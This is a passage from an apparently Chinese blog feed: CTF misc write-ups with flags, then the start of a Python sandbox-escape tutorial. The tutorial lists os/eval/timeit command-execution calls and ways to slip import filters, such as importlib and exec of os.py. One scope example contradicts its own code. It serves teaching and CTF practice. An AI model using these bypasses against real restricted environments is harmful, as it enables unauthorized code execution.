title="[ACTF新生赛2020]frequency"></a>[ACTF新生赛2020]frequency</h2><p>打开doc得到提示：你猜flag在哪？有两截哦：一部分在备注里面</p><p>通过base64然后字频统计得到actfplokmijnuhbygvrdxeszwq{}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br><span class="line">flag&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure><h2 id="MRCTF2020-摇滚DJ"><a href="#MRCTF2020-摇滚DJ" class="headerlink" title="[MRCTF2020]摇滚DJ"></a>[MRCTF2020]摇滚DJ</h2><p>得到wav，用Av分析感觉是SSTv，用kali分析sstv得到</p><p><img src="/image/media/2022/ctf/buu/5/13.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">merak&#123;r3ce1ved_4n_img&#125;</span><br></pre></td></tr></table></figure><h2 id="GUET-CTF2019-520的暗示"><a href="#GUET-CTF2019-520的暗示" class="headerlink" title="[GUET-CTF2019]520的暗示"></a>[GUET-CTF2019]520的暗示</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data=open(&#x27;photo.dat&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">file=open(&#x27;1.png&#x27;, &#x27;ab+&#x27;)</span><br><span class="line">for i in data:</span><br><span class="line">    file.write(bytes([i^0x33]))</span><br></pre></td></tr></table></figure><p>通过上面代码将每个字节跟0x33做异或操作，然后得到一个图片</p><p><img src="/image/media/2022/ctf/buu/5/14.png"></p><p>然后是社工可以用<a href="https://v.juhe.cn/cell/Triangulation/index.html?s=inner%E5%81%9A%E5%9F%BA%E7%AB%99%E5%9C%B0%E5%9D%80%E5%AE%9A%E4%BD%8D">https://v.juhe.cn/cell/Triangulation/index.html?s=inner做基站地址定位</a></p><p><img src="/image/media/2022/ctf/buu/5/15.png"></p><p>最后定位到桂林电子科技大学花江校区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;桂林电子科技大学花江校区&#125;</span><br></pre></td></tr></table></figure><h2 id="SCTF2019-Ready-Player-One"><a href="#SCTF2019-Ready-Player-One" class="headerlink" title="[SCTF2019]Ready_Player_One"></a>[SCTF2019]Ready_Player_One</h2><p>冲就行了</p><p><img src="/image/media/2022/ctf/buu/5/16.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sctf&#123;You_Are_The_Ready_Player_One!!!For_Sure!!!&#125;</span><br></pre></td></tr></table></figure><h2 id="Beautiful-Side"><a href="#Beautiful-Side" class="headerlink" title="Beautiful_Side"></a>Beautiful_Side</h2><p>听说最近二维码很火啊，呐，美丽的一半。 </p><p>binwalk+foremost得到半张flag，然后通过<a href="https://merricx.github.io/qrazybox/%E5%9C%A8%E7%BA%BF%E8%A1%A5%E9%BD%90%E4%BA%8C%E7%BB%B4%E7%A0%81">https://merricx.github.io/qrazybox/在线补齐二维码</a></p><p><img src="/image/media/2022/ctf/buu/5/17.png"></p><p>然后用tools</p><p><img src="/image/media/2022/ctf/buu/5/18.png"></p><p>得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag&#123;OQWIC_4DS1A_S034S&#125;</span><br></pre></td></tr></table></figure><h2 id="DDCTF2018-第四扩展FS"><a href="#DDCTF2018-第四扩展FS" class="headerlink" title="[DDCTF2018]第四扩展FS"></a>[DDCTF2018]第四扩展FS</h2><p>右键得到备注：Pactera</p><p>binwalk+foremost得到一个zip，然后通过刚刚图片的备注里面的zip，得到一个txt，然后字频分析得到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DCTF&#123;huanwe1sik4o!&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙箱逃逸</title>
      <link href="/article/2022-03-09-python%E6%B2%99%E7%AE%B1/"/>
      <url>/article/2022-03-09-python%E6%B2%99%E7%AE%B1/</url>
      
        <content type="html"><![CDATA[<p>主要总结和学习一下Python沙箱逃逸。</p><span id="more"></span><h1 id="Python沙箱逃逸"><a href="#Python沙箱逃逸" class="headerlink" title="Python沙箱逃逸"></a>Python沙箱逃逸</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__name__ 是属于 python 中的内置类属性，就是它会天生就存在于一个 python 程序中，代表对应程序名称。</span><br><span class="line">自己的__name__在自己用时就是 main，当自己作为模块被调用时就是自己的名字</span><br><span class="line">一段程序作为主线运行程序时其内置名称就是 __main__</span><br><span class="line">print(__name__)#main</span><br><span class="line"></span><br><span class="line">id()函数返回对象的唯一标识符，标识符是一个整数。CPython 中id()函数用于获取对象的内存地址。</span><br><span class="line">print(id(max))#2964786132208</span><br><span class="line"></span><br><span class="line">print(&#x27;whoami&#x27;[::-1])#imaohw反转</span><br><span class="line"></span><br><span class="line">getattr() 函数用于返回一个对象属性值。获取对象属性后返回值可直接使用：</span><br><span class="line"></span><br><span class="line">Python中is与==的使用区别</span><br><span class="line">==是比较两个对象的内容是否相等，即两个对象的“值“”是否相等，不管两者在内存中的引用地址是否一样。</span><br><span class="line">is比较的是两个实例对象是不是完全相同，它们是不是同一个对象，占用的内存地址是否相同。is比较两个条件：1.内容相同。2.内存中地址相同</span><br><span class="line"></span><br><span class="line">reload() 用于重新载入之前载入的模块。在Python2.x版本中reload()是内置函数，可以直线使用，参见Python2.xreload()函数。在Python2.x~ Python3.3版本移到imp包中(Python2.x 也可以导入 imp 包使用)，Python3.4 之后到版本移到了importlib包中。</span><br><span class="line"></span><br><span class="line">__class__功能和type()函数一样，都是查看对象所在的类。__class__可以套用</span><br><span class="line">__bases__和__bases__都是内置函数， 用来查看类的继承关系</span><br><span class="line"></span><br><span class="line">__subclasses__()查看类的直接子类集合，获取类的所有子类</span><br><span class="line"></span><br><span class="line">__globals__[&#x27;__file__&#x27;]获取当前的代码所在的文件名</span><br><span class="line"></span><br><span class="line">enumerate() 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。Python 2.3. 以上版本可用，2.6 添加 start 参数。</span><br><span class="line"></span><br><span class="line">__dict__ 是类的内置属性，用于以字典的形式存储类里的属性，也就是存储那些 self.xxx 的属性</span><br></pre></td></tr></table></figure><h3 id="版本区别"><a href="#版本区别" class="headerlink" title="版本区别"></a>版本区别</h3><ul><li>import</li></ul><p>在python中有时候需要从模块中导入函数，常用语法包括：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. import somemodule</span><br><span class="line">2. from somemodule import somefunction</span><br><span class="line">3. from somemodule import somefunction, anotherfunction, yetanotherfunction</span><br><span class="line">4. from somemodule import *</span><br></pre></td></tr></table></figure><p>如果在不同的模块中有同名函数，也可以使用as来给整个模块加一个别名或给模块的方法加一个别名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import math as foobar</span><br><span class="line">&gt;&gt;&gt; foobar.sqrt(4)#2.0</span><br></pre></td></tr></table></figure><ul><li>整数除法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print (1/3)#python2输出0，python3输出0.3333333333333333</span><br><span class="line">修改</span><br><span class="line">from __future__ import division</span><br><span class="line">print (1/3)#python2输出0.333333333333，python3输出0.3333333333333333</span><br></pre></td></tr></table></figure><ul><li>print语句</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python2的语法支持print(‘hello’)同时支持print ‘hello’但是不支持print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)</span><br><span class="line">python3的语法支持print(‘hello’)但不支持print ‘hello’可以支持print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)#python3正常输出，python2报错</span><br><span class="line">修改</span><br><span class="line">from __future__ import print_function</span><br><span class="line">print(&#x27;hello&#x27;, end=&#x27;\n&#x27;)#python3正常输出，python2正常输出</span><br><span class="line"></span><br><span class="line">Python 2.7可以通过 __future__ 将2.7版本中的print语句移除，让你可以使用Python3.X的print()函数的形式打印输出</span><br></pre></td></tr></table></figure><table><thead><tr><th>函数区别</th><th>python3</th><th>python2</th></tr></thead><tbody><tr><td>input()</td><td>接收任意数据类型</td><td>只支持正确的数值类型</td></tr><tr><td>raw_input()</td><td>没有此函数</td><td>数值和字符串,不能直接识别字符串</td></tr><tr><td>除法</td><td>不考虑除数或被除数里有一个是浮点型</td><td>必须是除数或被除数里面有一个是浮点型，在整除时才会出现小数；否则就成了整除</td></tr></tbody></table><h3 id="future语句"><a href="#future语句" class="headerlink" title="future语句"></a>future语句</h3><p><code>__future__</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">官方描述：https://docs.python.org/2.7/library/__future__.html官方描述</span><br><span class="line">__future__是一个模块而非单独的函数，引用主要有 3 个原因：</span><br><span class="line">1.避免混淆已有的分析 import 语句并查找 import 的模块的工具。</span><br><span class="line">2.确保 future 语句 在 2.1 之前的版本运行时至少能抛出 runtime 异常（import __future__ 会失败，因为 2.1 版本之前没有这个模块）。</span><br><span class="line">3.当引入不兼容的修改时，可以记录其引入的时间以及强制使用的时间。这是一种可执行的文档，并且可以通过 import __future__ 来做程序性的检查。</span><br><span class="line"></span><br><span class="line">概括：某个版本中出现了某个新的功能特性，而且这个特性和当前版本中使用的不兼容，也就是它在该版本中不是语言标准，那么我如果想要使用的话就需要从__future__模块导入。在2.1版本之前并没有__future__，所以使用它会引发异常。当然，在以后的某个版本中，比如说3中，某个特性已经成为标准的一部分，那么使用该特性就不用从__future__导入了。</span><br><span class="line"></span><br><span class="line">目的：关于版本的问题，__future__目的是把下一个版本的特性导入到当前版本，这样我们就可以在当前版本中测试一些新版本的特性，从而使得python未来版本的迁移更加容易。是为了在老版本的Python代码中兼顾新特性的一种方法。从python2.1开始，当一个新的语言特性首次出现在发行版中时，如果该新特性与旧版本的python不兼容，则该新特性默认会被禁用。</span><br><span class="line"></span><br><span class="line">作用：future语句是一种针对编辑器的指令，指明某个特定模块应当使用在某个python发行版中成为标准特性的语法或语义。</span><br></pre></td></tr></table></figure><h3 id="模块细节"><a href="#模块细节" class="headerlink" title="模块细节"></a>模块细节</h3><p><code>__builtin__和__builtins__</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">主要是以Python 2.7为例，因为在Python 3+中，__builtin__模块被命名为builtins</span><br></pre></td></tr></table></figure><ul><li>命名空间</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">所谓命名空间，其实指的是变量名称（标识符）到对象的映射。在一个正常的Python程序的执行过程中，至少存在两个命名空间：</span><br><span class="line">*全局命名空间*：一般由在程序的全局变量和它们对应的映射对象组成，存放的是当前py文件中（除去函数、类内部的）变量与值的对应关系以及函数名与函数的内存地址的对应关系。</span><br><span class="line">*内建命名空间*：在函数内部由函数局部变量和它们对应的映射对象组成，存放的是一些内置函数，比如input，print，list，len等。</span><br><span class="line">如果定义了函数，则还会有局部命名空间，存放的是函数内部的变量与值的对应关系。</span><br><span class="line">当一个函数被调用时，开辟局部命名空间，当函数执行结束后，局部命名空间消失。</span><br><span class="line">如果一个函数被调用多次，则每调用一次，都要重新开辟局部命名空间。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作用域可以分为两个作用域分别是全局作用域和局部作用域。</span><br><span class="line">全局作用域：全局命名空间+内置命名空间</span><br><span class="line">局部作用域：局部命名空间</span><br><span class="line">局部作用域可以引用全局作用域的变量。但不能修改全局作用域的变量。</span><br></pre></td></tr></table></figure><ul><li>内建函数</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">在启动Python解释器之后，即使没有创建任何的变量或者函数，还是会有许多函数可以使用，比如max，dir等函数:</span><br><span class="line">把这些函数称为内建函数，因为不需要作任何定义，在启动Python解释器的时候，就已经导入到内存当中供我们使用</span><br><span class="line">print(max) #&lt;built-in function max&gt;</span><br><span class="line">print(dir)#&lt;built-in function dir&gt;</span><br></pre></td></tr></table></figure><ul><li>dir函数(dir([object]))</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不带参数时，返回当前范围内的变量、方法和定义的类型列表</span><br><span class="line">带参数时，返回参数的属性、方法列表。</span><br><span class="line">如果参数包含方法__dir__()，该方法将被调用。如果参数不包含__dir__()，该方法将最大限度地收集参数信息。</span><br><span class="line">参数说明：object -- 对象、变量、类型</span><br><span class="line">dir()   #获得当前模块的属性列表</span><br><span class="line">dir([ ])    #查看列表的方法</span><br></pre></td></tr></table></figure><ul><li>内建命名空间与<code>__builtins__</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">其实准确地来说，是Python解释器在启动的时候会首先加载内建命名空间，内建命名空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身（注意区分函数名称和函数对象的区别）。</span><br><span class="line"></span><br><span class="line">这些命名空间由__builtins__模块中的名字构成：</span><br><span class="line">print(dir()) #Python 2.7运行得到[&#x27;__builtins__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;]</span><br><span class="line">可以看到有一个__builtins__的模块名称，这个模块本身定义了一个命名空间，即内建命名空间：</span><br><span class="line"></span><br><span class="line">dir这个内建命名空间</span><br><span class="line">print(dir(__builtins__))#得到内建函数的名称，如list、dict等，当然还有一些异常和其它属性。</span><br></pre></td></tr></table></figure><ul><li><code>__builtins__与__builtin__</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">既然内建命名空间由__builtins__模块中的命名空间定义，那么是不是也意味着内建命名空间中所对应的这些函数也是在__builtins__模块中实现的呢？</span><br><span class="line">print(__builtins__)#得到&lt;module &#x27;__builtin__&#x27; (built-in)&gt;</span><br><span class="line">从结果中可以看到，__builtins__其实还是引用了__builtin__模块而已，这说明真正的模块是__builtin__</span><br><span class="line"></span><br><span class="line">也就是说，前面提到的内建函数其实是在内建模块__builtin__中定义的，即__builtins__模块包含内建命名空间中内建名字的集合（因为它引用或者说指向了__builtin__模块），而真正的内建函数、异常和属性来自__builtin__模块。</span><br><span class="line">也就是说，在Python中，其实真正是只有__builtin__这个模块，并不存在__builtins__这个模块：</span><br><span class="line"></span><br><span class="line">import __builtin__</span><br><span class="line">import __builtins__</span><br><span class="line">&gt;&gt;&gt; ImportError: No module named __builtins__</span><br><span class="line">可以看到，导入__builtin__模块并没有问题，但导入__builtins__模块时就会提示不存在</span><br><span class="line"></span><br><span class="line">在Python中并没有__builtins__这个模块，只有__builtin__模块，__builtins__模块只是在启动Python解释器时，解释器为我们自动创建的一个到__builtin__模块的引用</span><br></pre></td></tr></table></figure><ul><li>更深层次的区别</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(1)在主模块__main__中</span><br><span class="line"></span><br><span class="line">import __builtin__</span><br><span class="line">print(__builtin__,id(__builtin__))#(&lt;module &#x27;__builtin__&#x27; (built-in)&gt;, 51100264L)</span><br><span class="line">print(__builtins__,id(__builtin__))#(&lt;module &#x27;__builtin__&#x27; (built-in)&gt;, 51100264L)</span><br><span class="line">__builtins__与__builtin__是完全一样的，它们指向的都是__builtin__这个内建模块</span><br><span class="line"></span><br><span class="line">可以看到，这时候__builtins__和__builtin__是完全一样的，它们都指向了同一个模块对象，其实这也是Python中引用传递的概念。</span><br><span class="line">其实这种情况跟我们创建一个变量并对它做一次引用传递时的情况是一样的，可以做如下测试：</span><br><span class="line">def func():</span><br><span class="line">    print (&#x27;test&#x27;)</span><br><span class="line">funcs=func</span><br><span class="line">print(func,func.__name__,id(funcs))#&lt;function func at 0x000002962FFCD550&gt; func 2844073448784</span><br><span class="line">print(funcs,funcs.__name__,id(funcs))#&lt;function func at 0x000002962FFCD550&gt; func 2844073448784</span><br><span class="line">print(funcs == func,funcs is func)#True True</span><br><span class="line"></span><br><span class="line">(2)不在主模块__main__中</span><br><span class="line">如果不是在主模块中使用__builtins__，这时候，__builtins__只是对__builtin__.__dict__的一个简单引用而已，可以通过下面的测试来验证说明。</span><br><span class="line">先创建一个test.py，后面我们需要在Python交互器中导入它，那么这时候对于test模块来说，它就不是主模块了。如下：</span><br><span class="line">import __builtin__</span><br><span class="line"></span><br><span class="line">print(&#x27;Module name:&#x27;, __name__)#(&#x27;Module name:&#x27;, &#x27;test&#x27;)</span><br><span class="line">print( __builtin__ == __builtins__,__builtin__ is __builtins__)#(False, False)</span><br><span class="line">print(id(__builtin__),id(__builtins__))#(50772584L, 50815320L)</span><br><span class="line">print(__builtin__.__dict__ == __builtins__,__builtin__.__dict__ is __builtins__)#(True, True)</span><br><span class="line">print(id(__builtin__.__dict__),id(__builtins__))#(50815320L, 50815320L)</span><br><span class="line"></span><br><span class="line">然后直接import test,就能看到输出</span><br><span class="line">可以看到输出的结果跟我们想的是完全一样的，即这时候__builtins__其实是对__builtin__.__dict__模块的引用。</span><br></pre></td></tr></table></figure><ul><li>总结</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果是在主模块__main__中，__builtins__直接引用__builtin__模块，此时模块名__builtins__与模块名__builtin__指向的都是同一个模块，即&lt;builtin&gt;内建模块（这里要注意变量名和对象本身的区别）</span><br><span class="line">如果不是在主模块中，那么__builtins__只是引用了__builtin__.__dict__</span><br><span class="line"></span><br><span class="line">默认情况下，在__main__模块中时，__builtins__是内置模块__builtin__（注意：没有&#x27;s&#x27;）；在任何其他模块中时，是模块本身字典的 __builtins__别名</span><br></pre></td></tr></table></figure><h3 id="python的LEGB"><a href="#python的LEGB" class="headerlink" title="python的LEGB"></a>python的LEGB</h3><p>Python的命名空间是一个字典，字典内保存了变量名称与对象之间的映射关系，因此，查找变量名就是在命名空间字典中查找键-值对。</p><p>我们已经知道了多个命名空间可以独立存在，而且可以在不同的层次上包含相同的变量名。作用域定义了Python在哪一个层次上查找某个变量名对应的对象。</p><p>接下来的问题就是：Python在查找‘名称-对象’映射时，是按照什么顺序对命名空间的不同层次进行查找的？</p><p>答案就是：使用的是LEGB规则，表示的是Local -&gt; Enclosed -&gt; Global -&gt; Built-in，其中的箭头方向表示的是搜索顺序。</p><p>LEGB含义解释：</p><p>L-Local(function)                           函数内的名字空间,可能是在一个函数或者类方法内部。</p><p>E-Enclosing (function locals)        外部嵌套函数的名字空间,可能是嵌套函数内，比如说 一个函数包裹在另一个函数内部。</p><p>G-Global(module)                         函数定义所在模块（文件）的名字空间,查找全局作用域</p><p>B-Builtin(Python)                          Python内置模块的名字空间,内置作用域</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># encoding: utf-8</span><br><span class="line">x = 1</span><br><span class="line">def foo():</span><br><span class="line">    x = 2</span><br><span class="line">    def innerfoo():</span><br><span class="line">        #x = 3</span><br><span class="line">        print(&#x27;locals &#x27;, x)</span><br><span class="line">    innerfoo()</span><br><span class="line">    print(&#x27;enclosing function locals &#x27;, x)</span><br><span class="line">foo()</span><br><span class="line">print(&#x27;global &#x27;, x)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">locals  3</span><br><span class="line">enclosing function locals  2</span><br><span class="line">global  1</span><br><span class="line"></span><br><span class="line">注释x = 3后</span><br><span class="line">locals  2</span><br><span class="line">enclosing function locals  2</span><br><span class="line">global  1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def innerfoo()Local即函数内部命名空间；</span><br><span class="line">def foo()Enclosing function locals外部嵌套函数的名字空间</span><br><span class="line">module(文件本身) Global(module)函数定义所在模块（文件）的名字空间</span><br><span class="line">Python内置模块的名字空间   Builtin</span><br></pre></td></tr></table></figure><p>如果某个变量名称与对象之间的映射在局部(Local)中没有找到，接下来就会在函数内部再次定义一个函数(Enclosed)进行搜索，如果函数内部再次定义一个函数也没有找到，然后就会到全局(Global)命名空间中进行查找，最后会在内建(Built-in)命名空间搜索（注：如果一个名称在所有命名空间中都没有找到，就会产生一个NameError）。</p><h3 id="命令执行的函数"><a href="#命令执行的函数" class="headerlink" title="命令执行的函数"></a>命令执行的函数</h3><p>python支持命令执行的方式有下面几个例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">eval#eval(&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#x27;)</span><br><span class="line">os#os.system(“dir”)或者os.popen(&#x27;whoami&#x27;).read()</span><br><span class="line">commands#仅限python2.x</span><br><span class="line">subprocess#subprocess.run(&#x27;whoami&#x27;)</span><br><span class="line">timeit#timeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;, number=1)</span><br><span class="line">platform#platform.popen(&#x27;whoami&#x27;).read()#python2写法，python3无效</span><br><span class="line">pty#pty.spawn(&#x27;ls&#x27;)#window无效</span><br><span class="line">bdb、cgi等等还有其他的方式</span><br></pre></td></tr></table></figure><h3 id="花里胡哨的姿势"><a href="#花里胡哨的姿势" class="headerlink" title="花里胡哨的姿势"></a>花里胡哨的姿势</h3><h4 id="花式import"><a href="#花式import" class="headerlink" title="花式import"></a>花式import</h4><p>首先可以知道常用的是import os，虽然可以直接过滤import os，但是可以通过import    os中间添加空格绕过，如果空格也被过滤了，可以使用下面的方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><p>而且可以知道import其本质就是把一个库导入，这样我们可以用with或者execfile等函数可以把文件打开但是需要知道文件的路径。</p><p>如果可以用sys可以看下面可以方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">print(sys.path)</span><br></pre></td></tr></table></figure><p>sys.path是python的搜索模块的路径集，是一个list， sys.path 变量的初始值来自：</p><ul><li>输入脚本的目录（当前目录）。</li><li>环境变量 PYTHONPATH 表示的目录列表中搜索(这和 shell 变量 PATH 具有一样的语法，即一系列目录名的列表)。</li><li>Python 默认安装路径中搜索。<br> 实际上，解释器由 sys.path 变量指定的路径目录搜索模块，该变量初始化时默认包含了输入脚本（或者当前目录）， PYTHONPATH 和安装目录。这样就允许 Python程序了解如何修改或替换模块搜索目录。</li></ul><p>轻量级的文件查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">a=input(&#x27;请输入想要查找的磁盘：&#x27;)+&#x27;:/&#x27;</span><br><span class="line">b=input(&#x27;请输入想要查找的文件名和后缀：&#x27;)#os.py</span><br><span class="line">for root,dirs,files in os.walk(a,topdown=True):</span><br><span class="line">    if b in files:</span><br><span class="line">        print(root)</span><br><span class="line">        continue</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">print(&quot;查找完毕&quot;)</span><br></pre></td></tr></table></figure><p>绕过import</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">with open(r&quot;C:\Users\30261\new\python\python3.9\Lib\site-packages\gevent\os.py&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">    exec(f.read())</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br><span class="line">#此方法需要知道os.py的路径，python2和python3都可以支持</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">execfile(r&#x27;C:\Users\30261\new\python\python3.9\Lib\site-packages\gevent\os.py&#x27;)</span><br><span class="line">system(&#x27;whoami&#x27;)</span><br><span class="line">##此方法需要知道os.py的路径，execfile仅支持python2，python3没有这个函数</span><br></pre></td></tr></table></figure><h4 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h4><p>代码中要是出现 os，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 